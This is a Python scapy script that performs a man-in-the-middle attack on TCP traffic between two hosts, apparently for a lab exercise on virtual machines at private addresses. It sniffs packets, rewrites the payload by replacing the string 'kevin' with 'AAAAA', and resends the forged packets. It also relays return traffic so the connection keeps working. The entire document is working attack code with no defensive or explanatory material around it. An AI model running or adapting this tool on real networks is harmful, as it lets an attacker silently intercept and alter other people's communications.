from scapy.all import *

VM_A_IP = "10.9.0.5"  # Replace with the actual IP address of VM A
VM_B_IP = "10.9.0.6"  # Replace with the actual IP address of VM B

def spoof_pkt(pkt):
    if pkt.haslayer(IP) and pkt.haslayer(TCP):
        if pkt[IP].src == VM_A_IP and pkt[IP].dst == VM_B_IP and pkt[TCP].payload:
            data = pkt[TCP].payload.load
            print("*** Original data: %s, length: %d" % (data, len(data)))

            newdata = data.replace(b'kevin', b'AAAAA')
            print("*** Modified data: %s" % (newdata))

            # Reconstruct the packet with the modified payload
            newpkt = IP(src=pkt[IP].src, dst=pkt[IP].dst) / TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport, flags=pkt[TCP].flags, seq=pkt[TCP].seq, ack=pkt[TCP].ack) / Raw(load=newdata)
            del newpkt[IP].chksum
            del newpkt[TCP].chksum

            send(newpkt)
            print("*** Sent modified packet")
        elif pkt[IP].src == VM_B_IP and pkt[IP].dst == VM_A_IP:
            newpkt = IP(src=pkt[IP].src, dst=pkt[IP].dst) / TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport, flags=pkt[TCP].flags, seq=pkt[TCP].seq, ack=pkt[TCP].ack) / Raw(load=pkt[TCP].payload.load)
            del newpkt[IP].chksum
            del newpkt[TCP].chksum

            send(newpkt)
            print("*** Sent packet from VM B to VM A")

# Sniff packets and call the spoof_pkt function
sniff(filter="tcp", prn=spoof_pkt, store=0)
